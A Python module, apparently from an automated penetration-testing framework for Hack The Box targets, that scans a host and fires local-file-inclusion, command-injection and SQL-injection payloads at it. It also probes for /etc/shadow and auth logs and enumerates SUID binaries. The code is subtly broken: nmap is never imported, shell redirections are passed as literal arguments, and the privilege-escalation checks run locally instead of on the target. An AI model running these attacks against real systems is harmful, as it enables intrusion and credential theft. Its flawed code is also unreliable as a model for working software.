#!/usr/bin/env python3
import os
import json
import subprocess
import requests
from datetime import datetime
from ..utils.htb_utils import HTBUtils

class LinuxExploitation:
    def __init__(self, target, logger, tool_manager=None, execution_engine=None, credentials=None):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.execution_engine = execution_engine
        self.credentials = credentials or {}
        self.output_dir = "reports/linux_exploitation"
        self.htb_utils = HTBUtils(logger)
        
        # Create output directory if it doesn't exist
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
    def run(self):
        """Main method to run Linux exploitation scenarios"""
        self.logger.info(f"Starting Linux exploitation for {self.target}")
        
        try:
            # Check if target is a web server
            is_web_server = self._check_web_server()
            
            if is_web_server:
                return self._exploit_web_server()
            else:
                return self._exploit_standard_server()
                
        except Exception as e:
            self.logger.error(f"Error during Linux exploitation: {str(e)}")
            return {}
            
    def _check_web_server(self):
        """Check if target is a web server"""
        try:
            # Check common web ports
            web_ports = [80, 443, 8080, 8443]
            nm = nmap.PortScanner()
            nm.scan(self.target, arguments=f'-p {",".join(map(str, web_ports))}')
            
            open_ports = []
            for port in web_ports:
                if str(port) in nm[self.target]['tcp'] and nm[self.target]['tcp'][str(port)]['state'] == 'open':
                    open_ports.append(port)
                    
            return len(open_ports) > 0
        except Exception as e:
            self.logger.error(f"Error checking web server: {str(e)}")
            return False
            
    def _exploit_web_server(self):
        """Exploit web server scenarios"""
        findings = {
            'web_technologies': self._identify_web_technologies(),
            'web_vulnerabilities': self._check_web_vulnerabilities(),
            'file_inclusion': self._check_file_inclusion(),
            'command_injection': self._check_command_injection(),
            'sql_injection': self._check_sql_injection()
        }
        
        # Save findings
        self._save_findings(findings, 'web_server')
        return findings
        
    def _exploit_standard_server(self):
        """Exploit standard Linux server scenarios"""
        findings = {
            'service_enumeration': self._enumerate_services(),
            'file_system': self._check_file_system(),
            'network_services': self._check_network_services(),
            'privilege_escalation': self._check_privilege_escalation()
        }
        
        # Save findings
        self._save_findings(findings, 'standard_server')
        return findings
        
    def _identify_web_technologies(self):
        """Identify web technologies in use"""
        findings = {}
        
        try:
            # Use whatweb for technology detection
            cmd = f"whatweb -a 3 {self.target}"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['whatweb_output'] = result.stdout
                
            # Check for common web frameworks
            frameworks = ['/wp-content/', '/wp-includes/', '/wp-admin/',
                         '/administrator/', '/admin/', '/joomla/',
                         '/drupal/', '/wordpress/', '/phpmyadmin/']
                         
            for framework in frameworks:
                try:
                    response = requests.get(f"http://{self.target}{framework}", timeout=5)
                    if response.status_code < 400:
                        findings['framework_detected'] = framework
                except:
                    continue
        except Exception as e:
            self.logger.error(f"Error identifying web technologies: {str(e)}")
            
        return findings
        
    def _check_web_vulnerabilities(self):
        """Check for web vulnerabilities"""
        findings = {}
        
        try:
            # Run nikto scan
            cmd = f"nikto -h {self.target}"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['nikto_scan'] = result.stdout
                
            # Check for common vulnerabilities
            vuln_checks = [
                ('/phpinfo.php', 'PHP Info Disclosure'),
                ('/server-status', 'Apache Status'),
                ('/robots.txt', 'Robots.txt Disclosure'),
                ('/.git/', 'Git Repository'),
                ('/backup/', 'Backup Directory')
            ]
            
            for path, vuln_type in vuln_checks:
                try:
                    response = requests.get(f"http://{self.target}{path}", timeout=5)
                    if response.status_code < 400:
                        findings[vuln_type] = {
                            'path': path,
                            'status_code': response.status_code
                        }
                except:
                    continue
        except Exception as e:
            self.logger.error(f"Error checking web vulnerabilities: {str(e)}")
            
        return findings
        
    def _check_file_inclusion(self):
        """Check for file inclusion vulnerabilities"""
        findings = {}
        
        try:
            # Test for LFI
            lfi_payloads = [
                '/etc/passwd',
                '/etc/hosts',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log'
            ]
            
            for payload in lfi_payloads:
                try:
                    response = requests.get(f"http://{self.target}/index.php?page={payload}", timeout=5)
                    if 'root:' in response.text or 'nginx' in response.text:
                        findings['lfi_vulnerable'] = True
                        findings['lfi_payload'] = payload
                except:
                    continue
        except Exception as e:
            self.logger.error(f"Error checking file inclusion: {str(e)}")
            
        return findings
        
    def _check_command_injection(self):
        """Check for command injection vulnerabilities"""
        findings = {}
        
        try:
            # Test for command injection
            cmd_payloads = [
                ';id;',
                '|id|',
                '`id`',
                '$(id)',
                '&id&'
            ]
            
            for payload in cmd_payloads:
                try:
                    response = requests.get(f"http://{self.target}/ping.php?ip=127.0.0.1{payload}", timeout=5)
                    if 'uid=' in response.text and 'gid=' in response.text:
                        findings['cmd_injection_vulnerable'] = True
                        findings['cmd_payload'] = payload
                except:
                    continue
        except Exception as e:
            self.logger.error(f"Error checking command injection: {str(e)}")
            
        return findings
        
    def _check_sql_injection(self):
        """Check for SQL injection vulnerabilities"""
        findings = {}
        
        try:
            # Test for SQL injection
            sql_payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--"
            ]
            
            for payload in sql_payloads:
                try:
                    response = requests.get(f"http://{self.target}/login.php?username={payload}&password=test", timeout=5)
                    if 'error' in response.text.lower() or 'sql' in response.text.lower():
                        findings['sql_injection_vulnerable'] = True
                        findings['sql_payload'] = payload
                except:
                    continue
        except Exception as e:
            self.logger.error(f"Error checking SQL injection: {str(e)}")
            
        return findings
        
    def _enumerate_services(self):
        """Enumerate running services"""
        findings = {}
        
        try:
            # Run nmap service scan
            nm = nmap.PortScanner()
            nm.scan(self.target, arguments='-sV -sC')
            
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        service = nm[host][proto][port]
                        findings[f"{proto}/{port}"] = {
                            'name': service.get('name', ''),
                            'product': service.get('product', ''),
                            'version': service.get('version', ''),
                            'state': service.get('state', '')
                        }
        except Exception as e:
            self.logger.error(f"Error enumerating services: {str(e)}")
            
        return findings
        
    def _check_file_system(self):
        """Check file system for sensitive files"""
        findings = {}
        
        try:
            # Check for common sensitive files
            sensitive_files = [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/network/interfaces',
                '/etc/apache2/apache2.conf',
                '/etc/nginx/nginx.conf',
                '/var/log/auth.log',
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log'
            ]
            
            for file_path in sensitive_files:
                try:
                    response = requests.get(f"http://{self.target}{file_path}", timeout=5)
                    if response.status_code < 400:
                        findings[file_path] = {
                            'status_code': response.status_code,
                            'content_length': len(response.content)
                        }
                except:
                    continue
        except Exception as e:
            self.logger.error(f"Error checking file system: {str(e)}")
            
        return findings
        
    def _check_network_services(self):
        """Check network services"""
        findings = {}
        
        try:
            # Check common network services
            services = {
                21: 'FTP',
                22: 'SSH',
                23: 'Telnet',
                25: 'SMTP',
                53: 'DNS',
                80: 'HTTP',
                443: 'HTTPS',
                3306: 'MySQL',
                5432: 'PostgreSQL',
                27017: 'MongoDB'
            }
            
            for port, service in services.items():
                try:
                    response = requests.get(f"http://{self.target}:{port}", timeout=5)
                    if response.status_code < 400:
                        findings[service] = {
                            'port': port,
                            'status_code': response.status_code
                        }
                except:
                    continue
        except Exception as e:
            self.logger.error(f"Error checking network services: {str(e)}")
            
        return findings
        
    def _check_privilege_escalation(self):
        """Check for privilege escalation vectors"""
        findings = {}
        
        try:
            # Check for SUID binaries
            cmd = f"find / -perm -4000 -type f 2>/dev/null"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['suid_binaries'] = result.stdout.split('\n')
                
            # Check for world-writable files
            cmd = f"find / -perm -2 -type f 2>/dev/null"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['world_writable_files'] = result.stdout.split('\n')
                
            # Check for cron jobs
            cmd = f"ls -la /etc/cron*"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['cron_jobs'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error checking privilege escalation: {str(e)}")
            
        return findings
        
    def _save_findings(self, findings, scenario):
        """Save exploitation findings to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"{self.output_dir}/{scenario}_{self.target}_{timestamp}.json"
            
            with open(output_file, 'w') as f:
                json.dump(findings, f, indent=4)
                
            self.logger.info(f"Exploitation findings saved to {output_file}")
        except Exception as e:
            self.logger.error(f"Error saving findings: {str(e)}") 